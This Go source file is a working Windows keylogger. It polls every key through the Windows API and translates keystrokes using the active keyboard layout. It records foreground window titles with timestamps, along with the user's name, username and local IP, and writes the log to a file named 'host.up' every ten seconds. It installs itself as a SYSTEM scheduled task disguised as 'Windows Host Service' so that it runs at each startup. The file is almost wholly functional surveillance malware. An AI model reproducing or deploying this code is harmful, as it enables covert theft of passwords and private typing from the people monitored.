package main

import (
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"syscall"
	"time"
	"unsafe"

	"github.com/gios/amigo/constants"
)

const logFile = "./host.up"

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
	procToUnicode                = user32.NewProc("ToUnicode")
	procActivateKeyboardLayout   = user32.NewProc("ActivateKeyboardLayout")

	procGetSystemWindowsDirectory = kernel32.NewProc("GetSystemWindowsDirectoryA")

	tmpTitle       string
	eventsBuf      string
	systemInfoData systemInfo
)

type systemInfo struct {
	windowsFolder string
	userName      string
	userUsername  string
	localIP       net.IP
}

var tmpKeylog = make(chan string)
var tmpWindow = make(chan string)

func (si *systemInfo) String() string {
	return "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
}

// User32.dll

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getKeyboardState(keyboardState *uint16) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func activateKeyboardLayout(hkl syscall.Handle) (hklResult syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procActivateKeyboardLayout.Addr(), 2, uintptr(hkl), 0x00000008, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hklResult = syscall.Handle(r0)
	return
}

func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procMapVirtualKey.Addr(), 2, uintptr(uCode), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	scanCode = syscall.Handle(r0)
	return
}

func toUnicode(virtKey syscall.Handle, scanCode syscall.Handle, keyState *uint16, pwszBuff *uint16) (value syscall.Handle) {
	r0, _, _ := syscall.Syscall6(
		procToUnicode.Addr(),
		6,
		uintptr(virtKey),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(keyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		256,
		0,
	)

	value = syscall.Handle(r0)
	return
}

func getKeyboardLayout(dword syscall.Handle) (hkl syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardLayout.Addr(), 1, uintptr(dword), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hkl = syscall.Handle(r0)
	return
}

func getWindowThreadProcessID(hwnd syscall.Handle) (dword syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessID.Addr(), 1, uintptr(hwnd), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	dword = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

// Kernel32.dll

func getSystemWindowsDirectory(lpBuffer *byte) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetSystemWindowsDirectory.Addr(), 2, uintptr(unsafe.Pointer(lpBuffer)), 256, 0)
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func fileInterval() {
	writeTicker := time.NewTicker(10 * time.Second)

	go func() {
		for {
			select {
			case <-writeTicker.C:
				writeLogFile(eventsBuf)
				eventsBuf = ""
			}
		}
	}()
}

func writeLogFile(data string) {
	file, openFileErr := os.OpenFile(logFile, os.O_APPEND|os.O_WRONLY, 0777)
	if openFileErr != nil {
		log.Fatalf("writeLogFile -> %v", openFileErr)
	}

	defer file.Close()

	if _, writeStringErr := file.WriteString(data); writeStringErr != nil {
		log.Fatalf("writeLogFile -> %v", writeStringErr)
	}
}

func createLogFile() {
	file, createErr := os.Create(logFile)
	if createErr != nil {
		log.Fatalf("createLogFile -> %v", createErr)
	}

	defer file.Close()
	file.WriteString(systemInfoData.String())
}

func getOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatalf("getOutboundIP -> %v", err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func getSystemInfo() {
	windowsDirectory := make([]byte, 256)
	_, getWindowsDirectoryErr := getSystemWindowsDirectory(&windowsDirectory[0])
	if getWindowsDirectoryErr != nil {
		log.Fatalf("getWindowsDirectory -> %v", getWindowsDirectoryErr)
	}

	user, userErr := user.Current()
	if userErr != nil {
		log.Fatalf("user.Current() -> %v", userErr)
	}

	systemInfoData = systemInfo{
		windowsFolder: string(windowsDirectory),
		userName:      user.Name,
		userUsername:  user.Username,
		localIP:       getOutboundIP(),
	}
}

func windowLogger() {
	for {
		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
		if getForegroundWindowErr != nil {
			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
		}
		window := make([]uint16, 256)
		getWindowText(foregroundWindow, &window[0], int32(len(window)))

		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
			tmpTitle = syscall.UTF16ToString(window)
			tmpWindow <- string("(" + time.Now().Format("2006-01-02 15:04:05") + ")" + "[" + syscall.UTF16ToString(window) + "]\r\n")
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func getLanguage() syscall.Handle {
	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
	if getForegroundWindowErr != nil {
		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
	}
	hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
	if getWindowThreadProcessIDErr != nil {
		log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
	}
	hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)

	if getKeyboardLayoutErr != nil {
		log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
	}

	return hkl
}

func getUnicodeKey(virtualCode int) string {
	keyboardBuf := make([]uint16, 256)

	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
	if getKeyboardStateErr != nil {
		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
	}

	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
	if mapVirtualKeyErr != nil {
		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
	}

	hkl := getLanguage()
	activateKeyboardLayout(hkl)

	unicodeBuf := make([]uint16, 256)
	toUnicode(syscall.Handle(virtualCode), scanCode, &keyboardBuf[0], &unicodeBuf[0])
	return syscall.UTF16ToString(unicodeBuf)
}

func keyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for Key := 0; Key <= 256; Key++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(Key))
			if Val&0x1 == 0 {
				continue
			}
			switch Key {
			case constants.VK_RETURN:
				tmpKeylog <- "\r\n[Enter]\r\n"
			case constants.VK_SPACE:
				tmpKeylog <- " "
			case constants.VK_MULTIPLY:
				tmpKeylog <- "*"
			case constants.VK_ADD:
				tmpKeylog <- "+"
			case constants.VK_SUBTRACT:
				tmpKeylog <- "-"
			case constants.VK_DECIMAL:
				tmpKeylog <- "."
			case constants.VK_SHIFT:
			case constants.VK_LBUTTON:
			case constants.VK_RBUTTON:
			case constants.VK_MBUTTON:
			case constants.VK_BACK:
			case constants.VK_TAB:
			case constants.VK_MENU:
			case constants.VK_CAPITAL:
			case constants.VK_ESCAPE:
			case constants.VK_PRIOR:
			case constants.VK_NEXT:
			case constants.VK_END:
			case constants.VK_HOME:
			case constants.VK_LEFT:
			case constants.VK_UP:
			case constants.VK_RIGHT:
			case constants.VK_DOWN:
			case constants.VK_SELECT:
			case constants.VK_PRINT:
			case constants.VK_EXECUTE:
			case constants.VK_SNAPSHOT:
			case constants.VK_INSERT:
			case constants.VK_DELETE:
			case constants.VK_HELP:
			case constants.VK_LWIN:
			case constants.VK_RWIN:
			case constants.VK_APPS:
			case constants.VK_SLEEP:
			case constants.VK_NUMPAD0:
			case constants.VK_NUMPAD1:
			case constants.VK_NUMPAD2:
			case constants.VK_NUMPAD3:
			case constants.VK_NUMPAD4:
			case constants.VK_NUMPAD5:
			case constants.VK_NUMPAD6:
			case constants.VK_NUMPAD7:
			case constants.VK_NUMPAD8:
			case constants.VK_NUMPAD9:
			case constants.VK_SEPARATOR:
			case constants.VK_DIVIDE:
			case constants.VK_F1:
			case constants.VK_F2:
			case constants.VK_F3:
			case constants.VK_F4:
			case constants.VK_F5:
			case constants.VK_F6:
			case constants.VK_F7:
			case constants.VK_F8:
			case constants.VK_F9:
			case constants.VK_F10:
			case constants.VK_F11:
			case constants.VK_F12:
			case constants.VK_NUMLOCK:
			case constants.VK_SCROLL:
			case constants.VK_LSHIFT:
			case constants.VK_RSHIFT:
			case constants.VK_LCONTROL:
			case constants.VK_RCONTROL:
			case constants.VK_LMENU:
			case constants.VK_RMENU:
				tmpKeylog <- ""
			default:
				unicodeKey := getUnicodeKey(Key)
				tmpKeylog <- unicodeKey
			}
		}
	}
}

func keyLoggerListener() {
	for {
		time.Sleep(1 * time.Millisecond)
		select {
		case key := <-tmpKeylog:
			eventsBuf = eventsBuf + key
		case window := <-tmpWindow:
			eventsBuf = eventsBuf + "\r\n" + window + "\r\n"
		default:
		}
	}
}

func addScheduler() {
	cmd, err := exec.Command(
		"schtasks",
		"/create",
		"/sc", "ONSTART",
		"/tn", "Windows Host Service",
		"/f",
		"/tr", "D:\\Projects\\go-projects\\bin\\amigo.exe",
		"/ru", "SYSTEM",
	).Output()

	if err != nil {
		log.Fatalf("addScheduler -> %v", err)
	}
	log.Println(string(cmd))
}

func main() {
	log.Println("Starting...")
	addScheduler()
	getSystemInfo()
	createLogFile()
	go fileInterval()
	go keyLogger()
	go windowLogger()
	go keyLoggerListener()
	select {}
}
